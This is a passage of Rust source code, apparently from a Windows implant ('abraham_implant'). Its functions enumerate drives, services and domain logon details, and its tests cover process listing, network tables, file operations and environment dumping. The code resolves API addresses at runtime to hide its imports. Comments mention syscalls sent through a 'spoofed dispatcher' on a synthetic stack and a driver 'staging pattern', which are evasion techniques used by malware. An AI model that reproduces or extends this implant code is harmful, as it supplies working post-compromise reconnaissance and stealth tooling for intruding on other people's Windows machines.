    let env = |key: &str| std::env::var(key).unwrap_or_default();
    out.push_str(&format!(
        "logon_server={}\nuser_dns_domain={}\n",
        env("LOGONSERVER"),
        env("USERDNSDOMAIN")
    ));
    Ok(out.into_bytes())
}

/// Drive inventory: letter, fs, free/total bytes.
fn disks() -> Result<Vec<u8>, String> {
    let letters: unsafe extern "system" fn(u32, *mut u16) -> u32 =
        match unsafe { syscalls::export_address("kernel32.dll", "GetLogicalDriveStringsW") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("GetLogicalDriveStringsW unresolved".into()),
        };
    let free_space: unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32 =
        match unsafe { syscalls::export_address("kernel32.dll", "GetDiskFreeSpaceExW") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("GetDiskFreeSpaceExW unresolved".into()),
        };
    let volume: unsafe extern "system" fn(
        *const u16,
        *mut u16,
        u32,
        *mut u32,
        *mut u32,
        *mut u32,
        *mut u16,
        u32,
    ) -> i32 = match unsafe { syscalls::export_address("kernel32.dll", "GetVolumeInformationW") } {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GetVolumeInformationW unresolved".into()),
    };
    let mut buffer = [0u16; 512];
    let len = unsafe { letters(buffer.len() as u32, buffer.as_mut_ptr()) } as usize;
    let mut drives = Vec::new();
    let mut run = Vec::new();
    for c in &buffer[..len.min(buffer.len())] {
        if *c == 0 {
            if run.is_empty() {
                break;
            }
            drives.push(String::from_utf16_lossy(&run));
            run.clear();
        } else {
            run.push(*c);
        }
    }
    let mut out = String::from("drive\tfs\tfree_gb\ttotal_gb\n");
    for drive in drives {
        let wide_drive = wide(&drive);
        let mut fs = [0u16; 32];
        let mut avail = 0u64;
        let mut total = 0u64;
        let mut free_total = 0u64;
        let ok_free =
            unsafe { free_space(wide_drive.as_ptr(), &mut avail, &mut total, &mut free_total) };
        let mut dummy = [0u32; 3];
        let fs_ok = unsafe {
            volume(
                wide_drive.as_ptr(),
                std::ptr::null_mut(),
                0,
                &mut dummy[0],
                &mut dummy[1],
                &mut dummy[2],
                fs.as_mut_ptr(),
                fs.len() as u32,
            )
        };
        out.push_str(&format!(
            "{}\t{}\t{}\t{}\n",
            drive.trim_end_matches('\\'),
            if fs_ok != 0 {
                String::from_utf16_lossy(&fs)
            } else {
                "-".into()
            },
            if ok_free != 0 {
                format!("{:.1}", avail as f64 / 1e9)
            } else {
                "-".into()
            },
            if ok_free != 0 {
                format!("{:.1}", total as f64 / 1e9)
            } else {
                "-".into()
            },
        ));
    }
    Ok(out.into_bytes())
}

/// Service inventory through the SCM: name, state, pid, display name.
/// The SC-manager calls follow the staging pattern of the driver
/// lifecycle (ABR-T013) — advapi32 resolved on demand.
fn services() -> Result<Vec<u8>, String> {
    let open_scm: unsafe extern "system" fn(*const u16, *const u16, u32) -> usize =
        match unsafe { syscalls::export_address("advapi32.dll", "OpenSCManagerW") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("OpenSCManagerW unresolved".into()),
        };
    let enum_ex: unsafe extern "system" fn(
        usize,
        u32,
        u32,
        u32,
        *mut u8,
        u32,
        *mut u32,
        *mut u32,
        *mut u32,
        usize,
    ) -> i32 = match unsafe { syscalls::export_address("advapi32.dll", "EnumServicesStatusExW") } {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("EnumServicesStatusExW unresolved".into()),
    };
    let close: unsafe extern "system" fn(usize) -> i32 =
        match unsafe { syscalls::export_address("advapi32.dll", "CloseServiceHandle") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("CloseServiceHandle unresolved".into()),
        };
    let scm = unsafe { open_scm(std::ptr::null(), std::ptr::null(), 0x0004) }; // ENUMERATE_SERVICE
    if scm == 0 {
        return Err("OpenSCManagerW failed (elevation may be required)".into());
    }
    let mut buffer = vec![0u8; 64 * 1024];
    let mut needed = 0u32;
    let mut returned = 0u32;
    let mut resume = 0u32;
    let ok = unsafe {
        enum_ex(
            scm,
            0,           // SC_ENUM_TYPE_INFO
            0x0000_0030, // SERVICE_WIN32
            0x0000_0003, // SERVICE_STATE_ALL
            buffer.as_mut_ptr(),
            buffer.len() as u32,
            &mut needed,
            &mut returned,
            &mut resume,
            0,
        )
    };
    unsafe { close(scm) };
    if ok == 0 {
        return Err(format!(
            "EnumServicesStatusExW failed (needed {needed} bytes)"
        ));
    }
    let read_ptr =
        |off: usize| -> usize { usize::from_le_bytes(buffer[off..off + 8].try_into().unwrap()) };
    let read_u32 =
        |off: usize| -> u32 { u32::from_le_bytes(buffer[off..off + 4].try_into().unwrap()) };
    let row_str = |ptr: usize| -> String {
        if ptr == 0 {
            return "-".into();
        }
        unsafe {
            let mut len = 0usize;
            let mut probe = ptr as *const u16;
            while *probe != 0 && len < 1024 {
                len += 1;
                probe = probe.add(1);
            }
            String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len))
        }
    };
    const STATE: [&str; 8] = [
        "unknown",
        "stopped",
        "start_pending",
        "stop_pending",
        "running",
        "continue_pending",
        "pause_pending",
        "paused",
    ];
    let mut out = String::from("name\tstate\tpid\tdisplay\n");
    // ENUM_SERVICE_STATUS_PROCESSW: ptr, ptr, SERVICE_STATUS_PROCESS
    // (9 DWORDs) — 52 bytes, 56 with x64 alignment.
    for i in 0..returned as usize {
        let row = i * 56;
        if row + 56 > buffer.len() {
            break;
        }
        let name = row_str(read_ptr(row));
        let display = row_str(read_ptr(row + 8));
        let state = read_u32(row + 20); // ptrs(16) + dwServiceType -> dwCurrentState
        let pid = read_u32(row + 44); // dwProcessId: 7th DWORD of the status block
        out.push_str(&format!(
            "{}\t{}\t{}\t{}\n",
            name,
            STATE[state.min(7) as usize],
            if pid == 0 {
                "-".to_string()
            } else {
                pid.to_string()
            },
            display
        ));
    }
    Ok(out.into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ps_lists_own_process_with_details() {
        // Runs NtQuerySystemInformation end-to-end through the spoofed
        // dispatcher — a real data-returning syscall on the synthetic
        // stack, not just a yield — plus the per-PID detail pass: the
        // implant's own row must carry its image path and command line.
        let out = processes().expect("ps module");
        let text = String::from_utf8_lossy(&out);
        assert!(
            text.starts_with("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\tuser\n"),
            "unexpected header: {}",
            text.lines().next().unwrap_or_default()
        );
        let own = std::process::id().to_string();
        let row = text
            .lines()
            .find(|line| line.starts_with(&own) && line.contains("abraham_implant"))
            .expect("own process row missing");
        assert!(row.contains(".exe"), "own row lacks image path: {row}");
    }

    #[test]
    fn ls_and_cat_roundtrip() {
        let dir = std::env::temp_dir().join("abraham_module_test");
        std::fs::create_dir_all(&dir).expect("mkdir");
        std::fs::write(dir.join("note.txt"), b"hello modules").expect("write");
        let path = dir.to_str().expect("utf8 path");
        let listing = listing(path).expect("ls module");
        assert!(String::from_utf8_lossy(&listing).contains("note.txt"));
        let data = read_file(&format!("{path}\\note.txt")).expect("cat module");
        assert_eq!(data, b"hello modules");
    }

    #[test]
    fn unknown_module_lists_available() {
        let err = run("definitely-not", "").unwrap_err();
        assert!(
            err.contains("ps"),
            "error should name the available modules: {err}"
        );
    }

    #[test]
    fn whoami_mentions_own_pid_and_build() {
        let out = whoami().expect("whoami module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains(&format!("pid={}", std::process::id())));
        assert!(text.contains("ppid="));
        assert!(text.contains("build=1"));
    }

    #[test]
    fn netstat_lists_something() {
        let out = netstat().expect("netstat module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("proto\tlocal\tremote\tstate\tpid\n"));
        assert!(text.contains("\ntcp\t"));
    }

    #[test]
    fn ipv6_formatter_matches_rfc5952_shapes() {
        assert_eq!(
            ipv6(&[0x20, 0x01, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]),
            "2001::1"
        );
        assert_eq!(
            ipv6(&[0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0x02, 0x11, 0x22, 0xff, 0xfe, 0x33, 0x44, 0x55]),
            "fe80::211:22ff:fe33:4455"
        );
        assert_eq!(ipv6(&[0; 16]), "::");
    }

    #[test]
    fn env_lists_path() {
        let out = environment().expect("env module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.to_uppercase().contains("PATH="));
    }

    #[test]
    fn fs_modules_roundtrip_in_tempdir() {
        let dir = std::env::temp_dir().join(format!("abraham-fs-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let nested = dir.join("a").join("b");
        make_dir(nested.to_str().unwrap()).expect("mkdir");
        assert!(nested.is_dir());
        let src = nested.join("f.txt");
        std::fs::write(&src, b"data").unwrap();
        let dst = nested.join("g.txt");
        copy_path(&format!("{} {}", src.display(), dst.display())).expect("cp");
        assert_eq!(std::fs::read(&dst).unwrap(), b"data");
        let renamed = nested.join("h.txt");
        move_path(&format!("{} {}", dst.display(), renamed.display())).expect("mv");
        assert!(renamed.exists() && !dst.exists());
        remove_path(dir.to_str().unwrap()).expect("rm");
        assert!(!dir.exists());
    }

    #[test]
    fn arp_lists_entries() {
        let out = arp_table().expect("arp module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("iface\taddress\tmac\ttype\n"));
        assert!(text.lines().count() >= 2, "no ARP entries: {text}");
    }

    #[test]
    fn route_lists_entries() {
        let out = route_table().expect("route module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("dest\tmask\tnexthop\tmetric\tiface\n"));
        assert!(text.lines().count() >= 2, "no routes: {text}");
    }

    #[test]
    fn domain_reports_join_state() {
        let out = domain_info().expect("domain module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains("join="), "no join line: {text}");
        assert!(text.contains("dns_hostname="));
    }

    #[test]
    fn disks_lists_the_system_drive() {
        let out = disks().expect("disks module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("drive\tfs\tfree_gb\ttotal_gb\n"));
        assert!(text.contains("C:"), "no C: drive: {text}");
    }

    #[test]
    fn services_lists_state_and_pid() {
        // SCM enumeration may require elevation; skip gracefully.
        let Ok(out) = services() else {
            return;
        };
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("name\tstate\tpid\tdisplay\n"));
        assert!(text.lines().count() >= 2, "no services: {text}");
    }
}
